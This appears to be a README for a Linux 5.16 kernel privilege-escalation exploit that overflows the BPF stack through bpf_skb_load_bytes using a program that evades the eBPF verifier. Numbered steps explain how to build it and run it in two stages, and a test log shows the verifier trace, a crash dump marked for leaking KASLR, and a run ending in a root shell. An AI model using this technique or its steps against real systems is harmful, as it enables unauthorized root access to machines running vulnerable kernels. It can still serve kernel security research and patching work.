
# bpf_skb_load_bytes stack overflow

`long bpf_skb_load_bytes(const void *skb, u32 offset, void *to, u32 len)` can read data from a socket onto the bpf stack.
If we can make `len` larger than the length of the bpf stack, we can just stack overflow.




## Use
1. Get a piece of ebpf code that bypasses the verifier to implement BPF_REG_8 of value `verify:0   fact:1` 
2. Fill the ebpf code into `struct bpf_insn prog[]` trigger vulnerability stage
3. Modify all offsets marked as `#define`
4. Run `./compile.sh` to build
5. Run `./exploit` to leak kaslr 
6. Run `./exploit kaslr_base` to get privilege escalation


## Test
Work in [linux 5.16.12](https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.16.12.tar.xz), without  qemu boot option `oops = panic`, context can be leaked by crashing log.

```
/ $ ./exploit
[*] sneaking evil bpf past the verifier
func#0 @0
0: R1=ctx(id=0,off=0,imm=0) R10=fp0
0: (b7) r9 = 64
1: R1=ctx(id=0,off=0,imm=0) R9_w=invP64 R10=fp0
1: (b7) r8 = 1
2: R1=ctx(id=0,off=0,imm=0) R8_w=invP1 R9_w=invP64 R10=fp0
2: (7f) r8 >>= r9
3: R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
3: (bf) r0 = r8
4: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
4: (27) r8 *= 256
5: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
5: (b7) r2 = 0
6: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R8_w=invP0 R9_w=invP64 R10=fp0
6: (bf) r3 = r10
7: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp0 R8_w=invP0 R9_w=invP64 R10=fp0
7: (07) r3 += -8
8: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R8_w=invP0 R9_w=invP64 R10=fp0
8: (b7) r4 = 8
9: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R4_w=invP8 R8_w=invP0 R9_w=invP64 R10=fp0
9: (0f) r4 += r8
10: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R4_w=invP8 R8_w=invP0 R9_w=invP64 R10=fp0
10: (85) call bpf_skb_load_bytes#26
11: R0_w=invP(id=0) R8_w=invP0 R9_w=invP64 R10=fp0 fp-8=mmmmmmmm
11: (95) exit
processed 12 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0

[*] creating socketpair()
[*] attaching bpf backdoor to socket
[    3.229895] BUG: kernel NULL pointer dereference, address: 0000000000000000
[    3.234288] #PF: supervisor instruction fetch in kernel mode
[    3.236929] #PF: error_code(0x0010) - not-present page
[    3.239462] PGD 80000000055c7067 P4D 80000000055c7067 PUD 55c6067 PMD 0 
[    3.243090] Oops: 0010 [#1] PREEMPT SMP PTI
[    3.245391] CPU: 0 PID: 127 Comm: exp Not tainted 5.16.12+ #1
[    3.248022] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[    3.252626] RIP: 0010:0x0
[    3.254573] Code: Unable to access opcode bytes at RIP 0xffffffffffffffd6.
[    3.257810] RSP: 0018:ffffc900005fbba8 EFLAGS: 00000246
[    3.260215] RAX: 0000000000000000 RBX: ffff8880054ae880 RCX: 0000000000000108
[    3.263446] RDX: 0000000000000008 RSI: ffff888004487100 RDI: ffffc900005fbc90
[    3.266528] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[    3.269680] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[    3.272299] R13: 0000000000000001 R14: ffffc90000035000 R15: ffff888003efea00
[    3.275537] FS:  000000000040a6f8(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
[    3.280482] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.284132] CR2: ffffffffffffffd6 CR3: 00000000055c0000 CR4: 00000000003006f0
[    3.287538] Call Trace:
[    3.289193] WARNING: kernel stack frame pointer at (____ptrval____) in exp:127 has bad value 0000000000000000
[    3.289608] unwind stack type:0 next_sp:0000000000000000 mask:0x2 graph_idx:0
[    3.289671] (____ptrval____): 0000000000000000 ...
[    3.289774] (____ptrval____): ffffc900005fbce8 (0xffffc900005fbce8)
[    3.289832] (____ptrval____): ffff888004f5a380 (0xffff888004f5a380)
[    3.289852] (____ptrval____): 0000000000000800 (0x800)
[    3.289870] (____ptrval____): 0000000000000000 ...
[    3.289882] (____ptrval____): ffffc900005fbcd8 (0xffffc900005fbcd8)
[    3.289899] (____ptrval____): ffffffff819c9a95 (sock_sendmsg+0x65/0x70)   <====this one can leak kaslr
[    3.290080] (____ptrval____): 0000000000000000 ...
[    3.290093] (____ptrval____): 000000000040a880 (0x40a880)
[    3.290111] (____ptrval____): ffffc900005fbd58 (0xffffc900005fbd58)
[    3.290129] (____ptrval____): ffffffff819c9b33 (sock_write_iter+0x93/0xf0) <====this one can leak kaslr
[    3.290148] (____ptrval____): 0000000000000000 ...
[    3.290161] (____ptrval____): ffff888005010000 (0xffff888005010000)
[    3.290177] (____ptrval____): 0000000000000000 ...
[    3.290189] (____ptrval____): ffffc900005fbd78 (0xffffc900005fbd78)
[    3.290206] (____ptrval____): 0000000000000000 ...
[    3.290217] (____ptrval____): ffffc900005fbda0 (0xffffc900005fbda0)
[    3.290234] (____ptrval____): e34835d6fbb36b00 (0xe34835d6fbb36b00)
[    3.290251] (____ptrval____): ffff8880051b2600 (0xffff8880051b2600)
[    3.290268] (____ptrval____): ffffc900005fbde8 (0xffffc900005fbde8)
[    3.290285] (____ptrval____): ffffffff8133e595 (new_sync_write+0x195/0x1b0)
[    3.290310] (____ptrval____): 000000000040a880 (0x40a880)
[    3.290327] (____ptrval____): 0000000000000800 (0x800)
[    3.290344] (____ptrval____): ffff888005010000 (0xffff888005010000)
[    3.290361] (____ptrval____): 0000000000000000 ...
[    3.290373] (____ptrval____): 0000000000000800 (0x800)
[    3.290390] (____ptrval____): ffffc900005fbd68 (0xffffc900005fbd68)
[    3.290407] (____ptrval____): 0000000000000001 (0x1)
[    3.290424] (____ptrval____): ffff8880051b2600 (0xffff8880051b2600)
[    3.290441] (____ptrval____): 0000000000000000 ...
[    3.290453] (____ptrval____): 4004000000000000 (0x4004000000000000)
[    3.290470] (____ptrval____): 0000000000000000 ...
[    3.290482] (____ptrval____): e34835d6fbb36b00 (0xe34835d6fbb36b00)
[    3.290498] (____ptrval____): ffff8880051b2600 (0xffff8880051b2600)
[    3.290515] (____ptrval____): ffffffffffffffea (0xffffffffffffffea)
[    3.290533] (____ptrval____): ffffc900005fbe20 (0xffffc900005fbe20)
[    3.290551] (____ptrval____): ffffffff81340ec5 (vfs_write+0x1c5/0x2a0)
[    3.290568] (____ptrval____): ffff8880051b2600 (0xffff8880051b2600)
[    3.290585] (____ptrval____): ffff8880051b2600 (0xffff8880051b2600)
[    3.290605] (____ptrval____): 000000000040a880 (0x40a880)
[    3.290622] (____ptrval____): 0000000000000800 (0x800)
[    3.290638] (____ptrval____): 0000000000000000 ...
[    3.290650] (____ptrval____): ffffc900005fbe60 (0xffffc900005fbe60)
[    3.290667] (____ptrval____): ffffffff81341171 (ksys_write+0xb1/0xe0)
[    3.290685] (____ptrval____): ffffffff81c40277 (syscall_exit_to_user_mode+0x27/0x50)
[    3.290707] (____ptrval____): e34835d6fbb36b00 (0xe34835d6fbb36b00)
[    3.290724] (____ptrval____): 0000000000000000 ...
[    3.290736] (____ptrval____): ffffc900005fbf58 (0xffffc900005fbf58)
[    3.290753] (____ptrval____): 0000000000000000 ...
[    3.290766] (____ptrval____): ffffc900005fbe70 (0xffffc900005fbe70)
[    3.290783] (____ptrval____): ffffffff813411ba (__x64_sys_write+0x1a/0x20)
[    3.290801] (____ptrval____): ffffc900005fbf48 (0xffffc900005fbf48)
[    3.290818] (____ptrval____): ffffffff81c3b13c (do_syscall_64+0x5c/0xc0)
[    3.290839] (____ptrval____): 0000000000000000 ...
[    3.290851] (____ptrval____): ffffc900005fbeb0 (0xffffc900005fbeb0)
[    3.290867] (____ptrval____): ffffffff81c40277 (syscall_exit_to_user_mode+0x27/0x50)
[    3.290885] (____ptrval____): ffffffff8133fa6c (__x64_sys_writev+0x1c/0x20)
[    3.290905] (____ptrval____): ffffc900005fbf48 (0xffffc900005fbf48)
[    3.290922] (____ptrval____): ffffffff81c3b149 (do_syscall_64+0x69/0xc0)
[    3.290941] (____ptrval____): 0000000000000000 ...
[    3.290953] (____ptrval____): ffffc900005fbee8 (0xffffc900005fbee8)
[    3.290970] (____ptrval____): ffffffff81c40277 (syscall_exit_to_user_mode+0x27/0x50)
[    3.290988] (____ptrval____): ffffffff819ca9ae (__x64_sys_socketpair+0x1e/0x30)
[    3.291006] (____ptrval____): ffffc900005fbf48 (0xffffc900005fbf48)
[    3.291023] (____ptrval____): ffffffff81c3b149 (do_syscall_64+0x69/0xc0)
...

/ $ ./exploit 0xffffffff81000000
[*] sneaking evil bpf past the verifier
func#0 @0
0: R1=ctx(id=0,off=0,imm=0) R10=fp0
0: (b7) r9 = 64
1: R1=ctx(id=0,off=0,imm=0) R9_w=invP64 R10=fp0
1: (b7) r8 = 1
2: R1=ctx(id=0,off=0,imm=0) R8_w=invP1 R9_w=invP64 R10=fp0
2: (7f) r8 >>= r9
3: R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
3: (bf) r0 = r8
4: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
4: (27) r8 *= 256
5: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R8_w=invP0 R9_w=invP64 R10=fp0
5: (b7) r2 = 0
6: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R8_w=invP0 R9_w=invP64 R10=fp0
6: (bf) r3 = r10
7: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp0 R8_w=invP0 R9_w=invP64 R10=fp0
7: (07) r3 += -8
8: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R8_w=invP0 R9_w=invP64 R10=fp0
8: (b7) r4 = 8
9: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R4_w=invP8 R8_w=invP0 R9_w=invP64 R10=fp0
9: (0f) r4 += r8
10: R0_w=invP0 R1=ctx(id=0,off=0,imm=0) R2_w=invP0 R3_w=fp-8 R4_w=invP8 R8_w=invP0 R9_w=invP64 R10=fp0
10: (85) call bpf_skb_load_bytes#26
11: R0_w=invP(id=0) R8_w=invP0 R9_w=invP64 R10=fp0 fp-8=mmmmmmmm
11: (95) exit
processed 12 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0

[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] status has been saved.
[*] got root
/ # 
```
